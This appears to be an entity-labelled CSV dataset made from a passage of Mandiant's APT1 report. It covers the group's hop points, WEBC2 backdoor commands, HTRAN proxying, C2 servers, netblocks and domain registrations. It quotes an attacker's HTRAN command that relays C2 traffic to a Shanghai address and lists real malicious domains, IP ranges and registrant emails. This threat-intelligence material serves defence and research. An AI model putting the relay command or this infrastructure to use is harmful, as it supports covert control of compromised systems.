DocName,text,intent
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," attackers typically use hops to connect to and control victim systems. Victim backdoors 
regularly connect out to hop points, waiting for the moment that the attacker is there to give them commands. However, 
exactly how this works is often specific to the tools they are using. 

MANUAL ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," UPDATES

As covered in the previous “Attack Lifecycle” section, ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," backdoor variants download and interpret data stored 
between tags in HTML pages as commands. They usually download HTML pages from a system within ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s hop 
infrastructure. We have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, intruders logging in to ,O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," servers and manually editing the HTML pages 
that backdoors will download. Because the commands are usually encoded and difficult to spell from memory, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
intruders typically do not type these strings, but instead copy and paste them into the HTML files. They likely generate 
the encoded commands on their own systems before pasting them in to an HTML file hosted by the hop point. For 
example, we observed an ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," attacker pasting the string “czo1NA==” into an HTML page. That string is the base64-
encoded version of “s:54”, meaning “sleep for 54 minutes” (or hours, depending on the particular backdoor). In lieu 
of manually editing an HTML file on a hop point, we have also observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders uploading new (already-edited) 
HTML files. 

",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report,"

When ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, attackers are not using ,O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report,", they require a “command and control” (C2) user interface so they can 
issue commands to the backdoor. This interface sometimes runs on their personal attack system, which is typically 
in ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,". In these instances, when a victim backdoor makes contact with a hop, the communications need to be 
forwarded from the hop to the intruder’s ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," system so the backdoor can talk to the C2 server software. We have 
observed 767 separate instances in which ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, intruders used the publicly available “,O
Mandiant_APT1_Report,HUC Packet Transmit Tool,tool
Mandiant_APT1_Report,"” 
or ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," on a hop. As always, keep in mind that these uses are confirmed uses, and likely represent only a small 
fraction of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s total activity.

The ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," utility is merely a middle-man, facilitating connections between the victim and the attacker who is using 
the hop point.

0100100001 0100100001

01010100010101010001 C2HTRAN
FIGure 22: the ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report, tool resides on ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," hop points and acts as a middle-man



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 42 www.mandiant.com

Typical use of ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," is fairly simple: the attacker must specify the originating IP address (of his or her workstation in 
",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"), and a port on which to accept connections. For example, the following command, which was issued by an 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," actor, will listen for incoming connections on port 443 on the hop and automatically proxy them to the ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," 
IP address ",O
Mandiant_APT1_Report,58.247.242.254,ioc
Mandiant_APT1_Report," on port 443:

htran -tran 443 ",O
Mandiant_APT1_Report,58.247.242.254,ioc
Mandiant_APT1_Report," 443

In the 767 observed uses of ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders supplied 614 distinct routable IP addresses. In other words, they 
used their hops to function as middlemen between victim systems and 614 different addresses. Of these addresses, 
613 of 614 are part of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s home networks:

taBLe 9: net blocks corresponding to IP addresses used to receive ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," communications 

number net block registered owner

340 ",O
Mandiant_APT1_Report,223.166.0.0 - 223.167.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

160 ",O
Mandiant_APT1_Report,58.246.0.0 - 58.247.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

102 ",O
Mandiant_APT1_Report,112.64.0.0 - 112.65.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

11 ",O
Mandiant_APT1_Report,139.226.0.0 - 139.227.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

1 ",O
Mandiant_APT1_Report,143.89.0.0 - 143.89.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Hong Kong University of Science and Technology,org
Mandiant_APT1_Report,"

C2 SERVER SOFTWARE ON HOP INFRASTRUCTURE

Occasionally, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," attackers have installed C2 server components on systems in their hop infrastructure rather than 
forwarding connections back to C2 servers in ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,". In these instances they do not need to use a proxy tool like 
",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," to interact with victim systems. However, it does mean that the intruders need to be able to interface with the 
(often graphical) C2 server software running on the hop. We have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders log in to their hop point, 
start the C2 server, wait for incoming connections, and then proceed to give commands to victim systems.

",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," variants may include a server component that provides a simple C2 interface to the intruder. This saves the 
intruder from having to manually edit webpages. That is, this server component receives connections from victim 
backdoors, displays them to the intruder, and then translates the intruder’s commands into HTML tags that the victim 
backdoors read.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 43 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," Servers

In the last two years alone, we have confirmed 937 ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," C2 servers — that is, actively listening or communicating 
programs — running on 849 distinct IP addresses. However, we have evidence to suggest that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," is running 
hundreds, and likely thousands, of other servers (see the Domains section below). The programs acting as ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
servers have mainly been: (1) ",O
Mandiant_APT1_Report,FTP,tool
Mandiant_APT1_Report,", for transferring files; (2) ",O
Mandiant_APT1_Report,web,tool
Mandiant_APT1_Report,", primarily for ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report,; (3) ,O
Mandiant_APT1_Report,RDP,tool
Mandiant_APT1_Report,", for remote graphical 
control of a system; (4) ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report,", for proxying; and (5) C2 servers associated with various backdoor families (covered in 
Appendix C: The Malware Arsenal). 

",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," (709)

US (109)

",O
Mandiant_APT1_Report,South Korea,country
Mandiant_APT1_Report, (11) ,O
Mandiant_APT1_Report,Taiwan,country
Mandiant_APT1_Report," (6)
",O
Mandiant_APT1_Report,Canada,country
Mandiant_APT1_Report," (3)
",O
Mandiant_APT1_Report,Australia,country
Mandiant_APT1_Report," (2)
",O
Mandiant_APT1_Report,Mexico,country
Mandiant_APT1_Report," (2)
",O
Mandiant_APT1_Report,Norway,country
Mandiant_APT1_Report," (2)
",O
Mandiant_APT1_Report,Belgium,country
Mandiant_APT1_Report," (1)
",O
Mandiant_APT1_Report,Denmark,country
Mandiant_APT1_Report," (1)
",O
Mandiant_APT1_Report,Indonesia,country
Mandiant_APT1_Report," (1)
",O
Mandiant_APT1_Report,India,country
Mandiant_APT1_Report," (1)
",O
Mandiant_APT1_Report,Singapore,country
Mandiant_APT1_Report," (1)

Global distribution of confirmed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," servers

",O
Mandiant_APT1_Report,223.166.0.0 - 223.167.255.255,ioc
Mandiant_APT1_Report,": 406
(",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,")

",O
Mandiant_APT1_Report,58.246.0.0 - 58.247.255.255,ioc
Mandiant_APT1_Report,": 180
(",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,") 

",O
Mandiant_APT1_Report,112.64.0.0 - 112.65.255.255,ioc
Mandiant_APT1_Report,": 93
(",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,") 

",O
Mandiant_APT1_Report,139.226.0.0 - 139.227.255.255,ioc
Mandiant_APT1_Report,": 19
(",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,) Other: 11 (including 7 in ,O
Mandiant_APT1_Report,Hong Kong,country
Mandiant_APT1_Report,")

Distribution of confirmed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, servers in ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"

FIGure 23: the global distribution of confirmed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," servers



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 44 www.mandiant.com

Domain Names

The Domain Name System (DNS) is the phone book of the Internet. In the same way that people program named 
contacts into their cell phones and no longer need to remember phone numbers, DNS allows people to remember 
names like “google.com” instead of IP addresses. When a person types “google.com” into a web browser, a DNS 
translation to an IP address occurs so that the person’s computer can communicate with ",O
Mandiant_APT1_Report,Google,org
Mandiant_APT1_Report,". Names that can be 
translated through DNS to IP addresses are referred to as Fully Qualified Domain Names (FQDNs).

0100100001 0100100001

01010100010101010001

",O
Mandiant_APT1_Report,ug-co.hugesoft.org,ioc
Mandiant_APT1_Report,"

      1010010010100101

1001100100011010100                     

1001100100011               

DNS QUERY        

“Here’s the IP address”

C2

FIGure 24: Dns queries are used to resolve ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," FQDns to many C2 server IPs



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 45 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s infrastructure includes FQDNs in addition 
to the IP addresses discussed above. The FQDNs 
play an important role in their intrusion campaigns 
because ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," embeds FQDNs as C2 addresses 
within their backdoors. In the last several years 
we have confirmed 2,551 FQDNs attributed to 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". Of these, we have redacted FQDNs that 
implicated victims by name and provided 2,046 in 
Appendix D. By using FQDNs rather than hard-
coded IP addresses as C2 addresses, attackers 
may dynamically decide where to direct C2 
connections from a given backdoor. That is, if they 
lose control of a specific hop point (IP address) 
they can “point” the C2 FQDN address to a 
different IP address and resume their control over 
victim backdoors. This flexibility allows the attacker 
to direct victim systems to myriad C2 servers and 
avoid being blocked.

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," FQDNs can be grouped into three categories: 
(1) registered zones, (2) third-party zones, and (3) 
hijacked domains. 

REGISTERED ZONES

A DNS zone represents a collection of FQDNs that 
end with the same name, and which are usually 
registered through a domain registration company 
and controlled by a single owner. For example, 
“",O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,"” is an FQDN but also represents 
a zone. The FQDNs “",O
Mandiant_APT1_Report,ug-co.hugesoft.org,ioc
Mandiant_APT1_Report,"” and 
“",O
Mandiant_APT1_Report,7cback.hugesoft.org,ioc
Mandiant_APT1_Report,” are part of the “,O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,"” zone and are called “subdomains” of the zone. 
The person who registered “",O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,"” may add 
as many subdomains as they wish and controls the 
IP resolutions of these FQDNs. ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has registered 
at least 107 zones ",O
Mandiant_APT1_Report,since 2004,timestamp
Mandiant_APT1_Report,". Within these zones, 
we know of thousands of FQDNs that have resolved 
to hundreds of IP addresses (which we suspect are 
hops) and in some instances to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s source IP 
addresses in ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,".

The first zone we became aware of was “",O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,"”, which was registered through ",O
Mandiant_APT1_Report,"eNom, Inc.",org
Mandiant_APT1_Report, in ,O
Mandiant_APT1_Report,October 2004,timestamp
Mandiant_APT1_Report,". The registrant supplied 
“",O
Mandiant_APT1_Report,uglygorilla@163.com,identity
Mandiant_APT1_Report,"” as an email address. The 
supplied registration information, which is still 
visible in public “whois” data as of ",O
Mandiant_APT1_Report,"February 3, 2013",timestamp
Mandiant_APT1_Report,", includes the following:

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," Zone Registrations

",O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,ustvb.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,uszzcs.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,hvmetal.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,hkcastte.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,attnpower.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,ifexcel.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,bpyoyo.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,skyswim.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,cslisten.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,bigish.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,chileexe77.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,issnbgkit.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,progammerli.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,idirectech.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,livemymsn.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,webservicesupdate.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,giftnews.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,onefastgame.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,conferencesinfo.com,ioc
Mandiant_APT1_Report,"

5 zones created

",O
Mandiant_APT1_Report,cometoway.org,ioc
Mandiant_APT1_Report,"

6 zones created

6 zones created

",O
Mandiant_APT1_Report,usnftc.org,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,phoenixtvus.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,ushongkong.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,newsesport.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,youipcam.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,olmusic100.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,todayusa.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,bluecoate.com,ioc
Mandiant_APT1_Report,"

4 zones created

",O
Mandiant_APT1_Report,bigdepression.net,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,arrowservice.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,blackcake.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,businessconsults.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,infosupports.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,newsonet.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,purpledaily.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,avvmail.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,shepmas.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,syscation.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,tibethome.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,microsoft-update-info.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,busketball.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,comrepair.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,gmailboxes.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,oplaymagzine.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,maltempata.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,nirvanaol.com,ioc
Mandiant_APT1_Report,"

7 zones created

",O
Mandiant_APT1_Report,cnndaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,satellitebbs.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,msnhome.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,usabbs.org,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,ns06.net,ioc
Mandiant_APT1_Report,"

6 zones created

",O
Mandiant_APT1_Report,copporationnews.com,ioc
Mandiant_APT1_Report,"

7 zones created
",O
Mandiant_APT1_Report,nytimesnews.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,cnnnewsdaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,applesoftupdate.com,ioc
Mandiant_APT1_Report,"

4 zones created

",O
Mandiant_APT1_Report,micyuisyahooapis.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,infobusinessus.org,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2004,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2005,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2006,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2007,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2008,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2009,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2010,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2011,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,"



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 46 www.mandiant.com

Domain Name:",O
Mandiant_APT1_Report,HUGESOFT.ORG,ioc
Mandiant_APT1_Report,"
Created On:",O
Mandiant_APT1_Report,25-Oct-2004 09:46:18 UTC,timestamp
Mandiant_APT1_Report," 
Registrant Name:",O
Mandiant_APT1_Report,huge soft,identity
Mandiant_APT1_Report,"
Registrant Organization:",O
Mandiant_APT1_Report,hugesoft,identity
Mandiant_APT1_Report,"
Registrant Street1:",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"
Registrant City:",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"
Registrant State/Province:S
Registrant Postal Code:200001
Registrant Country:",O
Mandiant_APT1_Report,CN,country
Mandiant_APT1_Report,"
Registrant Phone:+86.21000021
Registrant Email:",O
Mandiant_APT1_Report,uglygorilla@163.com,identity
Mandiant_APT1_Report,"

The supplied registrant information does not need to be accurate for the zone to be registered successfully. For 
example, “",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"” is not a street name. Nevertheless, it is noteworthy that ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," appeared in the first known 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," domain registration, along with a phone number that begins with ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s “+86” international code. In fact, 
",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," was listed as the registrant’s city in at least 24 of the 107 (22%) registrations. Compare this to the frequency 
with which other cities appeared in ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," zone registration information:

taBLe 10: Locations supplied in registration data other than ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"

number City state Country
7 ",O
Mandiant_APT1_Report,Beijing,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
5 ",O
Mandiant_APT1_Report,Calgary,city
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Canada,country
Mandiant_APT1_Report," 
4 ",O
Mandiant_APT1_Report,Guizhou,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
4 ",O
Mandiant_APT1_Report,Pasadena,city
Mandiant_APT1_Report, CA ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
4 ",O
Mandiant_APT1_Report,Houston,city
Mandiant_APT1_Report, TX ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
3 ",O
Mandiant_APT1_Report,Sydney,city
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Australia,country
Mandiant_APT1_Report,"
3 ",O
Mandiant_APT1_Report,Salt Lake,city
Mandiant_APT1_Report, UT ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
3 ",O
Mandiant_APT1_Report,Washington,city
Mandiant_APT1_Report,", DC ",O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Homewood,city
Mandiant_APT1_Report, AL ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Kalkaska,city
Mandiant_APT1_Report, MI ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Shallotte,city
Mandiant_APT1_Report, NC ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Yellow Spring,city
Mandiant_APT1_Report, OH ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,New York,city
Mandiant_APT1_Report, NY ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Provo,city
Mandiant_APT1_Report, UT ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Shenzhen,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Birmingham,city
Mandiant_APT1_Report, AL ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Scottsdale,city
Mandiant_APT1_Report, AZ ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Sunnyvale,city
Mandiant_APT1_Report, CA ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Albany,city
Mandiant_APT1_Report, NY ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Pearl River,city
Mandiant_APT1_Report, NY ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Chicago,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Moscow,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,Guatemala,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Nanning,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Wuhua,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
27 Registration information blocked or not available 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 47 www.mandiant.com

Some of the supplied registration information is obviously false. For example, consider the registration information 
supplied for the zone “",O
Mandiant_APT1_Report,uszzcs.com,ioc
Mandiant_APT1_Report,” in ,O
Mandiant_APT1_Report,2005,timestamp
Mandiant_APT1_Report,":

  ",O
Mandiant_APT1_Report,Victor,identity
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,etejedaa@yahoo.com,ioc
Mandiant_APT1_Report," +86.8005439436
  ",O
Mandiant_APT1_Report,Michael Murphy,identity
Mandiant_APT1_Report,"
  795 Livermore St.
  Yellow Spring,Ohio,",O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report," 45387

Here, a phone number with a Chinese prefix (“+86”) accompanied an address in the ",O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report,. Since the ,O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report," uses the prefix “+1”, it is highly unlikely that a person living in Ohio would provide a phone number beginning 
with “+86”. Additionally, the city name is spelled incorrectly, as it should be “",O
Mandiant_APT1_Report,Yellow Springs,city
Mandiant_APT1_Report,"” instead of “Yellow 
Spring”. This could have been attributed to a one-time spelling mistake, except the registrant spelled the city name 
incorrectly multiple times, both for the zones “",O
Mandiant_APT1_Report,uszzcs.com,ioc
Mandiant_APT1_Report,” and “,O
Mandiant_APT1_Report,attnpower.com,ioc
Mandiant_APT1_Report,"”. This suggests that the registrant 
really thought “Yellow Spring” was the correct spelling and that he or she did not, in fact, live or work in ",O
Mandiant_APT1_Report,Yellow Springs,city
Mandiant_APT1_Report,", 
Ohio. 

Overall, the combination of a relatively high number of “",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"” registrations with obviously false registration 
examples in other registrations suggests a partially uncoordinated domain registration campaign ",O
